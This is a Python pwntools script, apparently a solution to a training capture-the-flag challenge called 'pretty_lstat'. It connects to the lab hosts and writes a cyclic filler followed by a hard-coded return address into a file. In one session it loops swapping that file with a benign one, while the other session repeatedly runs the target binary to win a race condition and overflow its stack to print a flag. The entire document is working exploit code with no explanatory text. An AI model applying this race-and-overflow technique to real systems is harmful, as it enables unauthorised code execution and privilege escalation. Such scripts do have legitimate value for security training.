from pwn import *

def get_token(c) :
    c.recvuntil(b"token: ")
    return c.recvline().strip()

def attack(c) :
    c.recvuntil(b'$ ')
    c.sendline(b"while true; do ./home/user/pretty_lstat /home/user/data.txt /home/user/data.txt /home/user/data.txt; done")
    
    for i in range(10000) :
        try :
            res = c.recvline().decode("utf-8")
            print(res, end = '')

            if "Flag:" in res :
                # print(res)
                break
        except :
            pass

# def close(c) :
#     c.sendline(b"\x03")     # End of text == ^C
#     c.recvuntil(b'$ ')
#     c.sendline(b"exit")
#     c.recvuntil(b'$ ')
#     c.close()

filler = cyclic(72)
# print(filler)
xploit = b"\\x96\\x12\\x40\\x00\\x00\\x00\\x00\\x00"
# print(xploit)

c_token = remote("pretty-lstat.training.offensivedefensive.it", 8080, ssl = True)
token = get_token(c_token)
c_token.close()
print(token)

c1 = remote("private.training.offensivedefensive.it", 8080, ssl = True)
c1.recvuntil(b"Token: ")
c1.sendline(token)
c2 = remote("private.training.offensivedefensive.it", 8080, ssl = True)
c2.recvuntil(b"Token: ")
c2.sendline(token)

c1.recvuntil(b'$ ')
# c2.recvuntil(b'$ ')

c1.sendline(b"cd home/user")
# c2.sendline(b"cd home/user")

c1.recvuntil(b'$ ')
c1.sendline(b"echo -n \"Hello world\" > hello.txt")

c1.recvuntil(b'$ ')
c1.sendline(b"echo -n \"" + filler + b"\" > xploit.txt")

c1.recvuntil(b'$ ')
c1.sendline(b"echo -ne \"" + xploit + b"\" >> xploit.txt")

c1.recvuntil(b'$ ')
c1.sendline(b"while true; do cp hello.txt data.txt; cp xploit.txt data.txt; done")
attack(c2)

c1.close()
c2.close()